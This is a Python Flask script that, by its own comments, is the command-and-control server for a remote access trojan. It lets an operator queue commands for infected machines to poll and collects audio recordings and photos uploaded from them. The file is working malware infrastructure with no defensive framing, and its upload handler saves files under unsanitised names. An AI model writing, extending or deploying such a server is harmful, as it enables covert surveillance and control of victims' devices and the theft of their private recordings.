from flask import Flask, request, jsonify
import os

app = Flask(__name__)

# Variable to store the current command for the RAT
current_command = "NO_COMMAND"

# Directory to store uploaded files
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/command', methods=['GET'])
def send_command():
    """Endpoint for the RAT to poll and get the current command"""
    global current_command
    return jsonify({"command": current_command})

@app.route('/set_command', methods=['POST'])
def set_command():
    """Endpoint to set a command for the RAT"""
    global current_command
    data = request.get_json()
    command = data.get("command")
    if command:
        current_command = command
        return jsonify({"status": "Command set to {}".format(command)})
    return jsonify({"error": "No command provided"}), 400

@app.route('/upload', methods=['POST'])
def upload_file():
    """Endpoint to receive files (audio recordings, photos) from the RAT"""
    if 'file' not in request.files:
        return jsonify({"error": "No file part in the request"}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400

    file_path = os.path.join(UPLOAD_FOLDER, file.filename)
    file.save(file_path)
    return jsonify({"status": "File uploaded successfully", "file_path": file_path})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
